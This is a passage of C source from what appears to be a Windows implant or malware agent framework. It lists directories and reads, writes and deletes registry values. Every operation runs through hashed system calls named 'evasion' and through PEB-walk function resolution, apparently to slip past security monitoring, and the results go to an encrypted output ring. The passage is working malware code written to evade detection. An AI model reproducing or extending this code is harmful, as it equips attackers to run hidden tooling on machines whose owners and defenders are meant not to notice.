    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    HANDLE dir = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCREATEFILE,
        &dir, (ULONG)(FILE_LIST_DIRECTORY | SYNCHRONIZE), &oa, &iosb,
        (PLARGE_INTEGER)NULL, (ULONG)FILE_ATTRIBUTE_DIRECTORY,
        (ULONG)(FILE_SHARE_READ | FILE_SHARE_WRITE),
        (ULONG)FILE_OPEN,
        (ULONG)(FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT),
        (PVOID)NULL, (ULONG)0);

    if (!NT_SUCCESS(status))
        return NULL;

    /* Allocate result buffer: [count:u32][entries...] */
    #define FILE_LIST_BUF_SIZE  (32 * 1024)
    BYTE *result = (BYTE *)bus_mem_alloc(FILE_LIST_BUF_SIZE, PAGE_READWRITE);
    if (!result) {
        evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, dir);
        return NULL;
    }
    spec_memset(result, 0, FILE_LIST_BUF_SIZE);

    /* Reserve 4 bytes for count at start */
    DWORD offset = sizeof(DWORD);
    DWORD count = 0;

    /* Query buffer for NtQueryDirectoryFile */
    BYTE query_buf[4096];
    BOOL first = TRUE;

    for (;;) {
        spec_memset(&iosb, 0, sizeof(iosb));
        spec_memset(query_buf, 0, sizeof(query_buf));

        status = evasion_syscall(bus_get_evasion(),
            HASH_NTQUERYDIRECTORYFILE,
            dir, (HANDLE)NULL, (PVOID)NULL, (PVOID)NULL,
            &iosb, (PVOID)query_buf, (ULONG)sizeof(query_buf),
            (DWORD)FileBothDirectoryInformation,
            (BOOL)FALSE, (PUNICODE_STRING)NULL, (BOOL)first);

        first = FALSE;

        if (!NT_SUCCESS(status) && status != STATUS_BUFFER_OVERFLOW)
            break;

        /* Walk entries in the buffer */
        FILE_BOTH_DIR_INFORMATION *entry = (FILE_BOTH_DIR_INFORMATION *)query_buf;
        for (;;) {
            DWORD name_bytes = entry->FileNameLength;
            DWORD name_wchars = name_bytes / sizeof(WCHAR);

            /* Each result entry: [name_len:u16][name_wchars...][size:u64][attrs:u32] */
            DWORD entry_size = sizeof(WORD) + name_bytes +
                               sizeof(QWORD) + sizeof(DWORD);

            if (offset + entry_size > FILE_LIST_BUF_SIZE)
                goto done_listing;

            /* Write name_len (wchar count) */
            *(WORD *)(result + offset) = (WORD)name_wchars;
            offset += sizeof(WORD);

            /* Write name wchars */
            spec_memcpy(result + offset, entry->FileName, name_bytes);
            offset += name_bytes;

            /* Write file size */
            *(QWORD *)(result + offset) = (QWORD)entry->EndOfFile.QuadPart;
            offset += sizeof(QWORD);

            /* Write attributes */
            *(DWORD *)(result + offset) = entry->FileAttributes;
            offset += sizeof(DWORD);

            count++;

            if (entry->NextEntryOffset == 0)
                break;
            entry = (FILE_BOTH_DIR_INFORMATION *)((BYTE *)entry + entry->NextEntryOffset);
        }
    }

done_listing:
    /* Write entry count at start of buffer */
    *(DWORD *)result = count;

    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, dir);
    return (PVOID)result;
}

/* ------------------------------------------------------------------ */
/*  Registry API helper: build registry path UNICODE_STRING             */
/*  hive 0 = \Registry\Machine, hive 1 = \Registry\User               */
/* ------------------------------------------------------------------ */

#define BUS_MAX_REG_PATH_WCHARS 520

static BOOL bus_build_reg_path(DWORD hive, const char *path,
                                WCHAR *wbuf, UNICODE_STRING *us) {
    if (!path || !wbuf || !us)
        return FALSE;

    DWORD pos = 0;

    /* Write hive prefix */
    if (hive == 0) {
        /* \Registry\Machine\ */
        WCHAR prefix[] = { '\\','R','e','g','i','s','t','r','y',
                           '\\','M','a','c','h','i','n','e','\\', 0 };
        for (DWORD i = 0; prefix[i]; i++)
            wbuf[pos++] = prefix[i];
    } else {
        /* \Registry\User\ */
        WCHAR prefix[] = { '\\','R','e','g','i','s','t','r','y',
                           '\\','U','s','e','r','\\', 0 };
        for (DWORD i = 0; prefix[i]; i++)
            wbuf[pos++] = prefix[i];
    }

    /* Append subkey path */
    for (DWORD i = 0; path[i] != '\0'; i++) {
        if (pos >= BUS_MAX_REG_PATH_WCHARS - 1)
            return FALSE;
        wbuf[pos++] = (WCHAR)(unsigned char)path[i];
    }
    wbuf[pos] = 0;

    us->Buffer = wbuf;
    us->Length = (USHORT)(pos * sizeof(WCHAR));
    us->MaximumLength = (USHORT)((pos + 1) * sizeof(WCHAR));
    return TRUE;
}

static BOOL bus_build_value_name(const char *value, WCHAR *wbuf,
                                  UNICODE_STRING *us) {
    if (!value || !wbuf || !us)
        return FALSE;

    DWORD pos = 0;
    for (DWORD i = 0; value[i] != '\0'; i++) {
        if (pos >= BUS_MAX_REG_PATH_WCHARS - 1)
            return FALSE;
        wbuf[pos++] = (WCHAR)(unsigned char)value[i];
    }
    wbuf[pos] = 0;

    us->Buffer = wbuf;
    us->Length = (USHORT)(pos * sizeof(WCHAR));
    us->MaximumLength = (USHORT)((pos + 1) * sizeof(WCHAR));
    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  Registry API implementations                                       */
/* ------------------------------------------------------------------ */

static DWORD bus_reg_read(DWORD hive, const char *path, const char *value) {
    if (!path || !value)
        return 0;

    WCHAR wpath[BUS_MAX_REG_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_reg_path(hive, path, wpath, &us_path))
        return 0;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE key = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTOPENKEY, &key, (ULONG)KEY_QUERY_VALUE, &oa);

    if (!NT_SUCCESS(status))
        return 0;

    /* Build value name UNICODE_STRING */
    WCHAR wvalue[BUS_MAX_REG_PATH_WCHARS];
    UNICODE_STRING us_value;
    if (!bus_build_value_name(value, wvalue, &us_value)) {
        evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, key);
        return 0;
    }

    /* Query value — allocate buffer for KEY_VALUE_PARTIAL_INFORMATION */
    BYTE info_buf[512];
    ULONG result_len = 0;

    status = evasion_syscall(bus_get_evasion(),
        HASH_NTQUERYVALUEKEY,
        key, &us_value, (DWORD)KeyValuePartialInformation,
        (PVOID)info_buf, (ULONG)sizeof(info_buf), &result_len);

    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, key);

    if (!NT_SUCCESS(status))
        return 0;

    KEY_VALUE_PARTIAL_INFORMATION *info = (KEY_VALUE_PARTIAL_INFORMATION *)info_buf;

    /* Write result to output ring: [type:u32][data_len:u32][data...] */
    BYTE out_buf[BUS_OUTPUT_ENTRY_MAX];
    DWORD out_len = sizeof(DWORD) + sizeof(DWORD) + info->DataLength;
    if (out_len > BUS_OUTPUT_ENTRY_MAX)
        out_len = BUS_OUTPUT_ENTRY_MAX;

    *(DWORD *)out_buf = info->Type;
    *(DWORD *)(out_buf + sizeof(DWORD)) = info->DataLength;

    DWORD copy_len = out_len - 2 * sizeof(DWORD);
    if (copy_len > info->DataLength)
        copy_len = info->DataLength;
    spec_memcpy(out_buf + 2 * sizeof(DWORD), info->Data, copy_len);

    output_write(&g_bus_ctx.output_ring, out_buf, out_len, OUTPUT_BINARY);
    return info->DataLength;
}

static BOOL bus_reg_write(DWORD hive, const char *path, const char *value,
                          const BYTE *data, DWORD type) {
    if (!path || !value || !data)
        return FALSE;

    WCHAR wpath[BUS_MAX_REG_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_reg_path(hive, path, wpath, &us_path))
        return FALSE;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    /* Try NtOpenKey first, fall back to NtCreateKey */
    HANDLE key = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTOPENKEY, &key, (ULONG)KEY_SET_VALUE, &oa);

    if (!NT_SUCCESS(status)) {
        ULONG disposition = 0;
        status = evasion_syscall(bus_get_evasion(),
            HASH_NTCREATEKEY,
            &key, (ULONG)KEY_SET_VALUE, &oa,
            (ULONG)0, (PUNICODE_STRING)NULL,
            (ULONG)0, &disposition);

        if (!NT_SUCCESS(status))
            return FALSE;
    }

    /* Build value name */
    WCHAR wvalue[BUS_MAX_REG_PATH_WCHARS];
    UNICODE_STRING us_value;
    if (!bus_build_value_name(value, wvalue, &us_value)) {
        evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, key);
        return FALSE;
    }

    /* Compute data size from type — caller provides raw data with length
       encoded in the bus protocol.  For simplicity, use spec_strlen for
       REG_SZ, or pass full buffer for binary types. */
    DWORD data_size = 0;
    if (type == 1 || type == 2) {
        /* REG_SZ (1) or REG_EXPAND_SZ (2): data is null-terminated wide string */
        WCHAR *ws = (WCHAR *)data;
        while (ws[data_size / sizeof(WCHAR)] != 0)
            data_size += sizeof(WCHAR);
        data_size += sizeof(WCHAR);  /* Include null terminator */
    } else if (type == 4) {
        /* REG_DWORD */
        data_size = sizeof(DWORD);
    } else if (type == 11) {
        /* REG_QWORD */
        data_size = sizeof(QWORD);
    } else {
        /* REG_BINARY (3) or other: use output ring entry max as limit */
        /* Caller must provide length through the bus protocol */
        data_size = (DWORD)spec_strlen((const char *)data);
    }

    status = evasion_syscall(bus_get_evasion(),
        HASH_NTSETVALUEKEY,
        key, &us_value, (ULONG)0, (ULONG)type,
        (PVOID)data, (ULONG)data_size);

    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, key);
    return NT_SUCCESS(status);
}

static BOOL bus_reg_delete(DWORD hive, const char *path, const char *value) {
    if (!path || !value)
        return FALSE;

    WCHAR wpath[BUS_MAX_REG_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_reg_path(hive, path, wpath, &us_path))
        return FALSE;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE key = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTOPENKEY, &key, (ULONG)KEY_SET_VALUE, &oa);

    if (!NT_SUCCESS(status))
        return FALSE;

    WCHAR wvalue[BUS_MAX_REG_PATH_WCHARS];
    UNICODE_STRING us_value;
    if (!bus_build_value_name(value, wvalue, &us_value)) {
        evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, key);
        return FALSE;
    }

    status = evasion_syscall(bus_get_evasion(),
        HASH_NTDELETEVALUEKEY, key, &us_value);

    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, key);
    return NT_SUCCESS(status);
}

/* ------------------------------------------------------------------ */
/*  Output — write module results to encrypted ring buffer             */
/* ------------------------------------------------------------------ */

static BOOL bus_output(const BYTE *data, DWORD len, DWORD type) {
    return output_write(&g_bus_ctx.output_ring, data, len, type);
}

/* ------------------------------------------------------------------ */
/*  Resolve — get a clean function pointer via PEB walk                */
/* ------------------------------------------------------------------ */

static PVOID bus_resolve(const char *dll_name, const char *func_name) {
    if (!dll_name || !func_name)
        return NULL;

    DWORD mod_hash = spec_djb2_hash(dll_name);
    DWORD func_hash = spec_djb2_hash(func_name);

    PVOID module_base = find_module_by_hash(mod_hash);
    if (!module_base)
        return NULL;

    return find_export_by_hash(module_base, func_hash);
}

/* ------------------------------------------------------------------ */
/*  Logging — write log entries as OUTPUT_TEXT to ring buffer           */
/* ------------------------------------------------------------------ */

static void bus_log(DWORD level, const char *msg) {
    if (!msg)
        return;

    /* Format: [LEVEL] message */
    static const char *prefixes[] = { "[DBG] ", "[INF] ", "[WRN] ", "[ERR] " };
    const char *prefix = (level <= LOG_ERROR) ? prefixes[level] : prefixes[LOG_INFO];

    DWORD prefix_len = (DWORD)spec_strlen(prefix);
    DWORD msg_len = (DWORD)spec_strlen(msg);
    DWORD total = prefix_len + msg_len;

    if (total > BUS_OUTPUT_ENTRY_MAX)
        total = BUS_OUTPUT_ENTRY_MAX;

    BYTE buf[BUS_OUTPUT_ENTRY_MAX];
    spec_memcpy(buf, prefix, prefix_len);

    DWORD copy_len = total - prefix_len;
    spec_memcpy(buf + prefix_len, msg, copy_len);

    output_write(&g_bus_ctx.output_ring, buf, total, OUTPUT_TEXT);
}

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
void bus_test_set_ring_key(OUTPUT_RING *ring, const BYTE key[32],
                           const BYTE nonce[12]) {
    if (!ring)
        return;
    spec_memcpy(ring->enc_key, key, 32);
    spec_memcpy(ring->enc_nonce, nonce, 12);
}
#endif
